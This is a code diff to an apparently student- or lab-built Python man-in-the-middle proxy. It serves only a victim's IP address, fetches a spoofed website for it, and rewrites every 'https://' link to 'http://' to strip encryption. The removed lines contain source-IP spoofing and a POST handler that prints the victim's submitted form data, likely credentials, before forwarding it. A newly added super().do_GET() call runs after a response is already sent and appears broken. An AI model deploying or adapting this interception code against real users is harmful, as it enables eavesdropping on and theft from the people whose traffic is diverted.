@@ -3,9 +3,6 @@ import http.client
 import http.server
 import socketserver
 import requests
-from requests_toolbelt.adapters import source
-
-# TODO: Change the forwarder such that the packages sent to the server have the source ip of the victim.
 
 site_to_spoof = None
 ip_victim = None
@@ -15,7 +12,6 @@ ip_attacker = None
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def __init__(self, *args, **kwargs):
-        self.s = requests.Session()
         super().__init__(*args, **kwargs)
 
     def do_GET(self):
@@ -29,50 +25,21 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             print("Path:", self.path)
             print("Headers:", self.headers)
 
-            spoofed_source = source.SourceAddressAdapter(ip_attacker)
-            self.s.mount('https://', spoofed_source)
-            response = self.s.get("https://" + site_to_spoof + self.path, headers=self.headers)
+            response = requests.get("https://" + site_to_spoof + self.path, headers=self.headers)
+
+            # Replace all "https://" with "http://"
+            response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
 
             # Send the response back to the client
             self.send_response(response.status_code)
             self.end_headers()
-            self.wfile.write(response.content)
+            self.wfile.write(response_content)
         else:
             # Send a 403 Forbidden response
             self.send_response(403)
             self.end_headers()
             self.wfile.write(b'403 Forbidden: Access denied')
-
-    def do_POST(self):
-        # Get the client's IP address
-        client_ip = self.client_address[0]
-        
-        # Check if the client's IP address matches the allowed IP
-        if client_ip == ip_victim:
-            # Print request path and headers
-            print("Received POST request")
-            print("Path:", self.path)
-            print("Headers:", self.headers)
-
-            # Read the content length from the headers
-            content_length = int(self.headers['Content-Length'])
-            # Read the POST data
-            post_data = self.rfile.read(content_length)
-            print("Body:", post_data.decode('utf-8'))
-            
-            # Use requests to forward this request to site_to_spoof
-            response = requests.post("https://" + site_to_spoof + self.path, data=post_data)
-            
-            # Send the response back to the client
-            self.send_response(response.status_code)
-            self.end_headers()
-            self.wfile.write(response.content)
-        else:
-            # Send a 403 Forbidden response
-            self.send_response(403)
-            self.end_headers()
-            self.wfile.write(b'403 Forbidden: Access denied')
-
+        super().do_GET()
 
 class Forwarder:
     def __init__(self, interface, ip_attacker_, ip_victim_, site_to_spoof_):
